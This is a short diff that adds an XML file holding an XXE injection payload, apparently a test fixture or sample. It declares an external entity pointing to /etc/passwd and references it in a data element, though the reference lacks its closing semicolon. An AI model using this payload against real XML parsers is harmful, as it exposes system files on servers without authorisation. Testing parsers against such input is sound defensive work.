@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY evil SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <data>&evil</data>
+</root>
